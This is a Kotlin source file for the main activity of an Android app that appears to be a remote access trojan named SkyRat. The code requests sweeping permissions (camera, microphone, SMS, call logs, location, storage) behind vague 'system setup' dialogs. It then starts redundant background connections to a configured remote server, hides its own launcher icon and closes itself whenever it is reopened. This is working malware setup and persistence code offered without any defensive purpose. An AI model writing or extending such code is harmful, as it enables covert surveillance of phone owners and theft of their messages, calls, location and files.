package com.techsky.skyrat

import android.Manifest
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivityClass"
        private const val PREFS_NAME = "app_state"
        private const val KEY_SETUP_COMPLETE = "setup_complete"
        private const val KEY_IS_HIDDEN = "is_hidden"
        private const val KEY_PERMISSIONS_GRANTED = "permissions_granted"
        private const val PERMISSION_REQUEST_CODE = 1001
        private var setupComplete = false
    }

    private lateinit var context: Context
    private lateinit var activity: MainActivity
    private lateinit var sharedPrefs: SharedPreferences

    // Required permissions
    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE
    ).let { permissions ->
        // Add MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            permissions + Manifest.permission.MANAGE_EXTERNAL_STORAGE
        } else {
            permissions
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        context = applicationContext
        activity = this
        sharedPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        Log.d(TAG, "MainActivity created - Server: ${Config.IP}:${Config.PORT}")

        setContentView(R.layout.activity_main)

        // Check setup and permission status
        setupComplete = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        val permissionsGranted = sharedPrefs.getBoolean(KEY_PERMISSIONS_GRANTED, false)

        when {
            !permissionsGranted -> {
                Log.d(TAG, "Permissions not granted, requesting permissions")
                requestAllPermissions()
            }
            !setupComplete -> {
                Log.d(TAG, "Permissions granted, starting setup")
                startSetupProcess()
            }
            else -> {
                Log.d(TAG, "Setup completed and permissions granted")
                // Check if app should be hidden
                handleAppVisibility()
            }
        }
    }

    private fun requestAllPermissions() {
        val missingPermissions = requiredPermissions.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions already granted")
            onPermissionsGranted()
            return
        }

        Log.d(TAG, "Requesting ${missingPermissions.size} permissions")

        // Show explanation dialog
        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage("This app needs several permissions to function properly. Please grant all permissions when prompted.")
            .setPositiveButton("Continue") { _, _ ->
                ActivityCompat.requestPermissions(
                    this,
                    missingPermissions.toTypedArray(),
                    PERMISSION_REQUEST_CODE
                )
            }
            .setCancelable(false)
            .show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }

            if (allGranted) {
                Log.d(TAG, "All permissions granted by user")
                onPermissionsGranted()
            } else {
                Log.w(TAG, "Some permissions denied")
                showPermissionDeniedDialog()
            }
        }
    }

    private fun onPermissionsGranted() {
        // Mark permissions as granted
        sharedPrefs.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()

        // Now proceed with setup
        if (!setupComplete) {
            startSetupProcess()
        } else {
            handleAppVisibility()
        }
    }

    private fun showPermissionDeniedDialog() {
        AlertDialog.Builder(this)
            .setTitle("Permissions Denied")
            .setMessage("Some permissions were denied. The app may not function properly. Would you like to try again?")
            .setPositiveButton("Retry") { _, _ ->
                requestAllPermissions()
            }
            .setNegativeButton("Continue Anyway") { _, _ ->
                // Continue with limited functionality
                onPermissionsGranted()
            }
            .setCancelable(false)
            .show()
    }

    private fun startSetupProcess() {
        Log.d(TAG, "Starting setup process")

        val dialog = AlertDialog.Builder(this)
            .setTitle("System Setup")
            .setMessage("Initializing system services...")
            .setCancelable(false)
            .create()

        dialog.show()

        // Simulate setup time and then complete
        CoroutineScope(Dispatchers.Main).launch {
            delay(3000) // 3 second setup delay

            try {
                completeSetup()
                dialog.dismiss()
            } catch (e: Exception) {
                Log.e(TAG, "Setup failed: ${e.message}", e)
                dialog.dismiss()
                Toast.makeText(context, "Setup failed: ${e.message}", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun completeSetup() {
        if (setupComplete) {
            Log.d(TAG, "Setup already completed")
            handleAppVisibility()
            return
        }

        Log.d(TAG, "Completing setup process")
        setupComplete = true

        // Save setup completion state
        sharedPrefs.edit().putBoolean(KEY_SETUP_COMPLETE, true).apply()

        Toast.makeText(this, "Starting system services...", Toast.LENGTH_SHORT).show()

        try {
            // Initialize job scheduler
            Functions(activity).jobScheduler(applicationContext)
            Log.d(TAG, "Job scheduler initialized")

            // Start background services
            startBackgroundServices()

            Toast.makeText(context, "Setup complete. Services running.", Toast.LENGTH_SHORT).show()

            // Handle app icon visibility with delay
            CoroutineScope(Dispatchers.Main).launch {
                delay(3000) // Wait 3 seconds so user can see completion

                handleAppVisibility()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error starting services: ${e.message}", e)
            Toast.makeText(this, "Error starting services: ${e.message}", Toast.LENGTH_SHORT).show()
            finish()
        }
    }

    private fun handleAppVisibility() {
        if (Config.ICON) {
            Log.d(TAG, "Hiding app icon as configured")

            // Hide app icon and keep it hidden
            Functions(activity).hideAppIcon(context)

            // Save the hidden state in SharedPreferences
            sharedPrefs.edit().putBoolean(KEY_IS_HIDDEN, true).apply()

            Toast.makeText(context, "Running in background mode", Toast.LENGTH_SHORT).show()
        } else {
            Log.d(TAG, "App icon will remain visible as configured")
            Toast.makeText(context, "Setup complete", Toast.LENGTH_SHORT).show()
        }

        // Finish the activity after a short delay
        CoroutineScope(Dispatchers.Main).launch {
            delay(2000)
            finish()
        }
    }

    private fun startBackgroundServices() {
        Log.d(TAG, "Starting background services")

        try {
            // Start TCP connection in background using both methods for redundancy
            CoroutineScope(Dispatchers.IO).launch {
                // Method 1: Direct background manager
                try {
                    val backgroundManager = BackgroundTcpManager(context)
                    backgroundManager.startConnection()
                    Log.d(TAG, "Background TCP manager started")
                } catch (e: Exception) {
                    Log.e(TAG, "Background TCP manager failed: ${e.message}")
                }

                // Method 2: Service fallback
                delay(5000) // Wait 5 seconds before starting service backup
                try {
                    val serviceIntent = android.content.Intent(context, MainService::class.java)
                    startService(serviceIntent)
                    Log.d(TAG, "MainService started as backup")
                } catch (e: Exception) {
                    Log.e(TAG, "MainService failed: ${e.message}")
                }
            }

            // Initialize Jumper for additional connectivity monitoring
            CoroutineScope(Dispatchers.IO).launch {
                delay(3000)
                try {
                    val jumper = Jumper(context)
                    jumper.init()
                    Log.d(TAG, "Jumper initialized")
                } catch (e: Exception) {
                    Log.e(TAG, "Jumper failed: ${e.message}")
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start background services: ${e.message}", e)
        }
    }

    override fun onResume() {
        super.onResume()

        // Only check hidden state if setup is complete AND permissions are granted
        val isHidden = sharedPrefs.getBoolean(KEY_IS_HIDDEN, false)
        val setupDone = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        val permissionsGranted = sharedPrefs.getBoolean(KEY_PERMISSIONS_GRANTED, false)

        if (isHidden && setupDone && permissionsGranted && Config.ICON) {
            Log.d(TAG, "App resumed but should be hidden, finishing")
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MainActivity destroyed")
    }

    // Debug method to reset app state (for testing)
    private fun resetAppState() {
        Log.d(TAG, "Resetting app state for debugging")
        sharedPrefs.edit().clear().apply()
        setupComplete = false
    }
}